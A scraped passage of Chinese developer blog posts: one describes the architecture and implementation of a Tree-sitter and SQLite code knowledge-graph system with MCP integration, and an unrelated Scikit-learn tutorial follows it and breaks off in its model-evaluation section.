.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在现代软件开发中，代码库的复杂性与日俱增。传统的静态分析工具虽然能够提供基本的代码关系信息，但往往缺乏深层次的语义理解和上下文关联。随着AI辅助编程的普及，我们迫切需要一套能够为AI模型提供结构化代码知识的系统。</p>
<p>我们开发了Legacy Code Archaeologist——一个基于知识图谱的代码分析平台。本文将毫无保留地分享这套系统的完整构建过程，包括踩过的坑和积累的经验。</p>
<h2 data-id="heading-1">系统架构设计</h2>
<h3 data-id="heading-2">整体架构概览</h3>
<p>构建代码知识图谱系统的核心挑战在于如何将非结构化的代码转换为结构化的关系数据，并以高效的方式为AI模型提供服务。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "输入层"
        A[源代码文件] --&gt; B[文件监听器]
        B --&gt; C[增量检测]
    end
    
    subgraph "解析层"
        C --&gt; D[Tree-sitter解析器]
        D --&gt; E[语法树生成]
        E --&gt; F[符号表构建]
        F --&gt; G[关系提取器]
    end
    
    subgraph "存储层"
        G --&gt; H[图数据库]
        H --&gt; I[关系索引]
        I --&gt; J[缓存层]
    end
    
    subgraph "服务层"
        J --&gt; K[MCP协议层]
        K --&gt; L[RESTful API]
        L --&gt; M[WebSocket实时推送]
    end
    
    subgraph "应用层"
        M --&gt; N[AI助手集成]
        M --&gt; O[可视化界面]
        M --&gt; P[IDE插件]
    end
</code></pre>
<h3 data-id="heading-3">技术选型考量</h3>
<p>在系统设计初期，我们面临多个技术选型决策。这里分享几个关键的权衡：</p>
<h4 data-id="heading-4">解析器选择：Tree-sitter vs ANTLR</h4>



































<table><thead><tr><th>特性</th><th>Tree-sitter</th><th>ANTLR</th></tr></thead><tbody><tr><td>解析速度</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td></tr><tr><td>容错能力</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐</td></tr><tr><td>语言支持</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>增量解析</td><td>⭐⭐⭐⭐⭐</td><td>⭐</td></tr><tr><td>社区支持</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td></tr></tbody></table>
<p>最终选择Tree-sitter的原因：</p>
<ol>
<li><strong>增量解析能力</strong>：对于实时系统至关重要</li>
<li><strong>错误恢复机制</strong>：能够处理不完整或语法错误的代码</li>
<li><strong>统一接口</strong>：所有语言使用相同的查询语法</li>
</ol>
<h4 data-id="heading-5">存储方案：图数据库 vs 关系数据库</h4>
<p>经过性能测试，我们发现对于代码关系查询场景，SQLite配合适当的索引设计反而比Neo4j等专业图数据库性能更好：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "关系型存储设计"
        A[nodes表] --&gt; B[qualified_name索引]
        A --&gt; C[type索引]
        D[edges表] --&gt; E[src_id + dst_id复合索引]
        D --&gt; F[relation_type索引]
        A --&gt; D
    end
</code></pre>
<p>这种设计的优势：</p>
<ul>
<li><strong>部署简单</strong>：无需额外的图数据库服务</li>
<li><strong>查询灵活</strong>：SQL比Cypher更通用</li>
<li><strong>性能可控</strong>：索引策略完全可控</li>
</ul>
<h2 data-id="heading-6">核心组件实现</h2>
<h3 data-id="heading-7">代码解析引擎</h3>
<p>代码解析是整个系统的基础，需要从源代码中准确提取出实体和关系。以Python代码为例：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[Python源文件] --&gt; B[Tree-sitter解析]
    B --&gt; C[AST遍历]
    C --&gt; D[实体识别]
    C --&gt; E[关系提取]
    
    subgraph "实体类型"
        F[类定义]
        G[函数定义]
        H[变量定义]
        I[导入语句]
    end
    
    subgraph "关系类型"
        J[继承关系]
        K[调用关系]
        L[依赖关系]
        M[数据流关系]
    end
    
    D --&gt; F
    D --&gt; G  
    D --&gt; H
    D --&gt; I
    
    E --&gt; J
    E --&gt; K
    E --&gt; L
    E --&gt; M
</code></pre>
<p>关键的实现细节包括：</p>
<ol>
<li><strong>作用域解析</strong>：正确处理变量的作用域，避免命名冲突</li>
<li><strong>类型推导</strong>：基于赋值和函数签名推导变量类型</li>
<li><strong>跨文件引用</strong>：解析import语句，建立模块间的依赖关系</li>
</ol>
<h3 data-id="heading-8">增量更新机制</h3>
<p>对于大型代码库，全量重新解析是不现实的。我们设计了一套增量更新机制：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant FS as 文件系统监听
    participant IU as 增量更新器
    participant Parser as 解析器
    participant Graph as 图存储
    participant Event as 事件总线

    FS-&gt;&gt;IU: 文件变更事件
    IU-&gt;&gt;IU: 计算影响范围
    IU-&gt;&gt;Graph: 删除旧关系
    IU-&gt;&gt;Parser: 解析变更文件
    Parser-&gt;&gt;Graph: 插入新关系
    Graph-&gt;&gt;Event: 广播更新事件
    Event-&gt;&gt;Client: 推送给前端
</code></pre>
<p>增量更新的核心算法：</p>
<ol>
<li><strong>依赖分析</strong>：构建文件间的依赖图</li>
<li><strong>影响范围计算</strong>：找出需要重新解析的文件集合</li>
<li><strong>关系清理</strong>：删除过时的关系记录</li>
<li><strong>选择性重建</strong>：只重新构建受影响的部分</li>
</ol>
<h3 data-id="heading-9">MCP协议集成</h3>
<p>Model Context Protocol (MCP)是我们与AI模型通信的桥梁。协议栈的设计如下：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "MCP协议栈"
        A[HTTP/SSE传输层] --&gt; B[JSON-RPC消息层]
        B --&gt; C[工具调用层]
        C --&gt; D[资源访问层]
    end
    
    subgraph "工具类型"
        E[scan_full - 全量扫描]
        F[scan_incremental - 增量扫描] 
        G[analyze_relationships - 关系分析]
    end
    
    subgraph "资源类型"
        H[graph/stats - 统计信息]
        I[graph/nodes - 节点详情]
        J[graph/edges - 关系列表]
    end
    
    C --&gt; E
    C --&gt; F
    C --&gt; G
    
    D --&gt; H
    D --&gt; I  
    D --&gt; J
</code></pre>
<h2 data-id="heading-10">性能优化实践</h2>
<h3 data-id="heading-11">查询优化策略</h3>
<p>在实际生产环境中，我们发现查询性能是系统可用性的关键。以下是几个重要的优化策略：</p>
<h4 data-id="heading-12">1. 索引设计</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 核心索引设计</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_nodes_qualified_name <span class="hljs-keyword">ON</span> nodes(qualified_name);
<span class="hljs-keyword">CREATE</span> INDEX idx_nodes_type <span class="hljs-keyword">ON</span> nodes(type);
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_src_dst <span class="hljs-keyword">ON</span> edges(src_id, dst_id);
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_relation <span class="hljs-keyword">ON</span> edges(relation_type);

<span class="hljs-comment">-- 复合查询优化</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_edges_complex <span class="hljs-keyword">ON</span> edges(src_id, relation_type, dst_id);
</code></pre>
<h4 data-id="heading-13">2. 缓存策略</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[查询请求] --&gt; B{缓存检查}
    B --&gt;|命中| C[返回缓存结果]
    B --&gt;|未命中| D[数据库查询]
    D --&gt; E[更新缓存]
    E --&gt; F[返回结果]
    
    subgraph "缓存层级"
        G[内存缓存 - 热点数据]
        H[Redis缓存 - 会话数据]
        I[本地文件缓存 - 图数据]
    end
</code></pre>
<h4 data-id="heading-14">3. 批处理优化</h4>
<p>对于大型项目的扫描，我们采用批处理策略：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">batch_process_files</span>(<span class="hljs-params">file_paths: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], batch_size: <span class="hljs-built_in">int</span> = <span class="hljs-number">50</span></span>):
    <span class="hljs-string">"""批量处理文件，避免内存溢出"""</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(file_paths), batch_size):
        batch = file_paths[i:i + batch_size]
        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> asyncio.TaskGroup() <span class="hljs-keyword">as</span> tg:
            tasks = [tg.create_task(parse_file(fp)) <span class="hljs-keyword">for</span> fp <span class="hljs-keyword">in</span> batch]
        
        <span class="hljs-comment"># 每个批次后进行垃圾回收</span>
        gc.collect()
</code></pre>
<h3 data-id="heading-15">内存管理</h3>
<p>大型代码库分析时，内存使用是一个挑战：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[内存使用监控] --&gt; B{内存使用率检查}
    B --&gt;|&gt; 80%| C[触发垃圾回收]
    B --&gt;|&gt; 90%| D[暂停解析]
    C --&gt; E[释放缓存]
    D --&gt; F[等待内存释放]
    E --&gt; G[继续处理]
    F --&gt; G
</code></pre>
<h2 data-id="heading-16">实际部署经验</h2>
<h3 data-id="heading-17">容器化部署</h3>
<p>生产环境中，我们使用Docker进行部署：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 多阶段构建优化镜像大小
FROM python:3.11-slim as builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.11-slim
WORKDIR /app
COPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages
COPY . .
EXPOSE 8080
CMD ["python", "run_web_server.py", "--host", "0.0.0.0"]
</code></pre>
<h3 data-id="heading-18">监控和告警</h3>
<p>系统监控的指标设计：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "性能指标"
        A[解析速度 - files/sec]
        B[查询延迟 - ms]
        C[内存使用率 - %]
    end
    
    subgraph "业务指标"  
        D[图谱规模 - nodes/edges]
        E[增量更新频率 - updates/min]
        F[API调用量 - qps]
    end
    
    subgraph "告警规则"
        G[解析速度 &lt; 10 files/sec]
        H[查询延迟 &gt; 1000ms]
        I[内存使用 &gt; 85%]
    end
</code></pre>
<h2 data-id="heading-19">踩坑总结</h2>
<p>在系统开发过程中，我们遇到了不少技术挑战，这里分享几个重要的经验：</p>
<h3 data-id="heading-20">1. Tree-sitter内存泄漏</h3>
<p>早期版本中发现Tree-sitter在长时间运行后会出现内存泄漏，解决方案：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 定期释放解析器资源</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ParserManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.parser = <span class="hljs-literal">None</span>
        self.parse_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, code: <span class="hljs-built_in">str</span></span>):
        <span class="hljs-keyword">if</span> self.parse_count &gt; <span class="hljs-number">1000</span>:  <span class="hljs-comment"># 每1000次解析后重建</span>
            self.parser = <span class="hljs-literal">None</span>
            self.parse_count = <span class="hljs-number">0</span>
            
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.parser:
            self.parser = get_parser()
            
        self.parse_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> self.parser.parse(<span class="hljs-built_in">bytes</span>(code, <span class="hljs-string">'utf8'</span>))
</code></pre>
<h3 data-id="heading-21">2. 循环依赖处理</h3>
<p>代码中的循环依赖会导致解析死循环，我们采用深度限制和访问记录：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">resolve_dependencies</span>(<span class="hljs-params">node: <span class="hljs-built_in">str</span>, visited: <span class="hljs-type">Set</span>[<span class="hljs-built_in">str</span>], depth: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):
    <span class="hljs-keyword">if</span> depth &gt; <span class="hljs-number">50</span> <span class="hljs-keyword">or</span> node <span class="hljs-keyword">in</span> visited:  <span class="hljs-comment"># 防止无限递归</span>
        <span class="hljs-keyword">return</span> []
    
    visited.add(node)
    <span class="hljs-comment"># ... 依赖解析逻辑</span>
</code></pre>
<h3 data-id="heading-22">3. 大文件处理</h3>
<p>对于超大文件（&gt;1MB），直接解析可能导致系统卡死：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">should_skip_file</span>(<span class="hljs-params">file_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:
    <span class="hljs-string">"""检查文件是否应该跳过解析"""</span>
    size = os.path.getsize(file_path)
    <span class="hljs-keyword">if</span> size &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>:  <span class="hljs-comment"># 1MB</span>
        logger.warning(<span class="hljs-string">f"Skipping large file: <span class="hljs-subst">{file_path}</span> (<span class="hljs-subst">{size}</span> bytes)"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h2 data-id="heading-23">未来展望</h2>
<p>基于当前系统的实践经验，我们计划在以下几个方向进行改进：</p>
<h3 data-id="heading-24">智能记忆系统</h3>
<p>当前系统的一个主要问题是会将大量数据一次性传递给AI模型，导致上下文过长。下一版本将集成智能记忆系统：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[用户查询] --&gt; B[查询理解]
    B --&gt; C[记忆检索]
    C --&gt; D[相关性排序]
    D --&gt; E[分层数据返回]
    
    subgraph "记忆层级"
        F[架构概览层]
        G[模块关系层] 
        H[函数细节层]
        I[实现代码层]
    end
    
    E --&gt; F
    E --&gt; G
    E --&gt; H
    E --&gt; I
</code></pre>
<h3 data-id="heading-25">跨语言支持</h3>
<p>扩展到更多编程语言的支持：</p>



































<table><thead><tr><th>语言</th><th>优先级</th><th>挑战</th><th>计划</th></tr></thead><tbody><tr><td>Java</td><td>高</td><td>泛型处理</td><td>Q4 2025</td></tr><tr><td>TypeScript</td><td>高</td><td>类型推导</td><td>Q1 2026</td></tr><tr><td>C++</td><td>中</td><td>模板系统</td><td>Q2 2026</td></tr><tr><td>Go</td><td>中</td><td>接口实现</td><td>Q3 2026</td></tr></tbody></table>
<h2 data-id="heading-26">结语</h2>
<p>构建代码知识图谱系统是一个复杂的工程，涉及编译原理、图论、系统设计等多个技术领域。通过两年的实践，我们深刻认识到，技术选型的重要性、性能优化的必要性，以及持续迭代的价值。</p>
<p>希望这篇文章能够为有类似需求的开发者提供一些参考。如果您有任何问题或建议，欢迎通过GitHub Issues与我们交流。</p>
<hr/>
<p>*参考作品：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwanchuang159%2Flegacy-code-archaeologist" target="_blank" title="https://gitee.com/wanchuang159/legacy-code-archaeologist" ref="nofollow noopener noreferrer">legacy-code-archaeologist: Legacy Code Archaeologist - AI驱动的代码分析与MCP协议支持</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[机器学习Scikit-learn库的使用技巧]]></title>    <link>https://juejin.cn/post/7579811819667718196</link>    <guid>https://juejin.cn/post/7579811819667718196</guid>    <pubDate>2025-12-05T01:07:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579811819667718196" data-draft-id="7579851956211073076" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="机器学习Scikit-learn库的使用技巧"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2025-12-05T01:07:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深圳蔓延科技"/> <meta itemprop="url" content="https://juejin.cn/user/1919099566570249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            机器学习Scikit-learn库的使用技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1919099566570249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深圳蔓延科技
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T01:07:12.000Z" title="Fri Dec 05 2025 01:07:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>sklearn（文章统一使用简称）是Python里最实用的机器学习库，今天我教大家怎么简单的使用它。</p>
<h2 data-id="heading-0">安装</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 安装的时候用全名</span>
<span class="hljs-comment"># pip install scikit-learn</span>

<span class="hljs-comment"># 导入的时候用简称</span>
<span class="hljs-keyword">import</span> sklearn
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression

</code></pre>
<p>安装好后，接下来分几个方向介绍使用方法。</p>
<h2 data-id="heading-1">一、数据准备</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> datasets
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split
<span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler

<span class="hljs-comment"># 1. 加载数据（内置数据集练手用）</span>
iris = datasets.load_iris()
X, y = iris.data, iris.target  <span class="hljs-comment"># X是特征，y是标签</span>

<span class="hljs-comment"># 2. 划分训练集和测试集（必须做）</span>
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>  <span class="hljs-comment"># random_state固定随机种子，结果可复现</span>
)

<span class="hljs-comment"># 3. 数据标准化（很多算法需要）</span>
scaler = StandardScaler()
X_train_scaled = scaler.fit_transform(X_train)  <span class="hljs-comment"># 先fit再transform</span>
X_test_scaled = scaler.transform(X_test)        <span class="hljs-comment"># 用训练集的参数transform测试集</span>
</code></pre>
<h2 data-id="heading-2">二、分类算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeClassifier
<span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier
<span class="hljs-keyword">from</span> sklearn.svm <span class="hljs-keyword">import</span> SVC
<span class="hljs-keyword">from</span> sklearn.neighbors <span class="hljs-keyword">import</span> KNeighborsClassifier

<span class="hljs-comment"># 各种分类器用法都差不多，三步走</span>
classifiers = {
    <span class="hljs-string">'逻辑回归'</span>: LogisticRegression(random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'决策树'</span>: DecisionTreeClassifier(random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'随机森林'</span>: RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'SVM'</span>: SVC(kernel=<span class="hljs-string">'rbf'</span>, random_state=<span class="hljs-number">42</span>),
    <span class="hljs-string">'KNN'</span>: KNeighborsClassifier(n_neighbors=<span class="hljs-number">5</span>)
}

<span class="hljs-keyword">for</span> name, clf <span class="hljs-keyword">in</span> classifiers.items():
    clf.fit(X_train_scaled, y_train)           <span class="hljs-comment"># 1. 训练</span>
    score = clf.score(X_test_scaled, y_test)   <span class="hljs-comment"># 2. 预测并评估</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: 准确率 <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-3">三、回归算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression, Ridge, Lasso
<span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeRegressor
<span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestRegressor

<span class="hljs-comment"># 加载回归数据</span>
boston = datasets.load_boston()  <span class="hljs-comment"># 已弃用，这里只是示例</span>
X, y = boston.data, boston.target
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)

<span class="hljs-comment"># 回归模型</span>
regressors = {
    <span class="hljs-string">'线性回归'</span>: LinearRegression(),
    <span class="hljs-string">'岭回归'</span>: Ridge(alpha=<span class="hljs-number">1.0</span>),
    <span class="hljs-string">'Lasso回归'</span>: Lasso(alpha=<span class="hljs-number">0.1</span>),
    <span class="hljs-string">'随机森林回归'</span>: RandomForestRegressor(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)
}

<span class="hljs-keyword">for</span> name, reg <span class="hljs-keyword">in</span> regressors.items():
    reg.fit(X_train, y_train)
    r2_score = reg.score(X_test, y_test)  <span class="hljs-comment"># R²分数，越接近1越好</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: R²分数 <span class="hljs-subst">{r2_score:<span class="hljs-number">.3</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-4">四、聚类算法</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> KMeans, DBSCAN, AgglomerativeClustering
<span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> silhouette_score

<span class="hljs-comment"># 无监督学习，没有y</span>
X = iris.data

<span class="hljs-comment"># KMeans（最常用）</span>
kmeans = KMeans(n_clusters=<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)
labels = kmeans.fit_predict(X)  <span class="hljs-comment"># 直接得到分组标签</span>

<span class="hljs-comment"># 评估聚类效果（轮廓系数）</span>
score = silhouette_score(X, labels)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"KMeans轮廓系数: <span class="hljs-subst">{score:<span class="hljs-number">.3</span>f}</span>"</span>)

<span class="hljs-comment"># 其他聚类算法</span>
dbscan = DBSCAN(eps=<span class="hljs-number">0.5</span>, min_samples=<span class="hljs-number">5</span>)
hierarchical = AgglomerativeClustering(n_clusters=<span class="hljs-number">3</span>)
</code></pre>
<h2 data-id="heading-5">五、模型评估</h2>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> (
    accuracy_score, precision_score, recall_score, f1_score,
    confusion_matrix, classification_report,
    mean_squared_error, r2_score
)

<span class="hljs-comment"># 分类任务评估</span>
clf = LogisticRegression(random_state=<span class="hljs-number">42</span>)
clf.fit(X_train_scaled, y_train)
y_pred = clf.predict(X_test_scaled)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"准确率:"</span>, accuracy_score(y_test, y_pred))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"精确率:"</span>, precision_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"召回率:"</span>, recall_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"F1分数:"</span>, f1_score(y_test, y_pred, average=<span class="hljs-string">'macro'</span>))

<span class="hljs-comment"># 混淆矩阵（可视化谁分错了）</span>
